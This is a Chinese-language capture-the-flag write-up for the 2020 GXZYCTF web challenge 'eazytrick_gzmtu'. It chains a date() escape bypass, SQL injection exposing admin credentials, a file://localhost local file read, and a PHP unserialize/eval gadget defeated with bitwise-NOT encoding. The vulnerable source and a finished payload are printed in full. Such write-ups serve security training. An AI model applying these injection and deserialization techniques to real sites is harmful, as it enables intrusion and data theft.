---
title: 2020 GXZYCTF eazytrick_gzmtu
date: 2020-03-09 09:52:20
tags:
- SQL
- file读取本地文件
categories:
- Web
- PHP
top: 
---

首先进入页面提示

```php
?time=Y 或者 Y=2020
```

然后经过测试，发现这是经过date函数处理的，而绕过这个函数，只需要在每个字符前面添加反斜杠

![1584694675(1)](C:\Users\asus\Desktop\wp\web_1\2020_GXZYCTF_eazytrick_gzmtu\2020_GXZYCTF_eazytrick_gzmtu\1584694675(1).jpg)

然后就是正常的SQL注入，基本没有过滤任何函数

得到数据库的内容为

```
url： /eGlhb2xldW5n username： admin password： 20200202goodluck
```

访问 /eGlhb2xldW5n，登录后台后存在文件读取

```
url=file://localhost/var/www/html/index.php
```

这儿使用file://localhost绕过本地

然后读取得到的源码为：

index.php

```php
<?php include('conn.php');
error_reporting(0);
$time = date($_GET['time']);
$sql = "select * from `content` where `createtime` = '$time' ";
$r = $conn->query($sql);
$content = $r->fetch_array(MYSQL_ASSOC);?>
```

eGlhb2xldW5n/check.php

```php
<?phpinclude("../conn.php");
if(empty($_SESSION['login']))
		{die('请登录!');}
if(isset($_GET['url'])){
	$url = $_GET['url'];
	$parts = parse_url($url);
	if(empty($parts['host']) || $parts['host'] != 'localhost') {   
	die('请从本地访问');}	
if(!preg_match("/flag|fl|la|ag|fla|lag|log/is", $parts['path'])){		
readfile($url);	}
else{	die('不要搞这些奇奇怪怪的东西。');	}
}
```

/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php

```php
	<?php

class trick{
	public $gf;
	public function content_to_file($content){	
		$passwd = $_GET['pass'];
		if(preg_match('/^[a-z]+\.passwd$/m',$passwd)) 
	{ 
	if(strpos($passwd,"20200202")){
		echo file_get_contents("/".$content);
	}
	 } 
	}
public function aiisc_to_chr($number){
	if(strlen($number)>2){
	$str = "";
	 $number = str_split($number,2);
	 foreach ($number as $num ) {
	 	$str = $str .chr($num);
	 }
	 return strtolower($str);
	}
	return chr($number);
}
public function calc(){
	$gf=$this->gf;
	if(!preg_match('/[a-zA-z0-9]|\&|\^|#|\$|%/', $gf)){
	  	eval('$content='.$gf.';');
	  	$content =  $this->aiisc_to_chr($content); 
	  	return $content;
	}
}
public function __destruct(){
    $this->content_to_file($this->calc());
    
}
}
unserialize((base64_decode($_GET['code'])));

?>
```

绕过正则用`%0a`，两位的限制，它最后有个`tolowercase()`，可以用大写绕过，

字母的过滤，利用取反操作

```python
a = 'FLAG'
res = ''
for i in a:
    res += str(ord(i))
print(res)
```

```php
<?php
class trick{
    public $gf;
}
$s = "70766571";
$s = urlencode(~$s);
$a = new trick();
$a->gf = urldecode('~'.$s);
echo base64_encode(serialize($a));
//另一种写法
//$a = new trick();
//$a->gf = '~'.(~'70766571');
```

最终结果为Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czo5OiJ+yM/IycnKyM4iO30=

然后url编码传参即可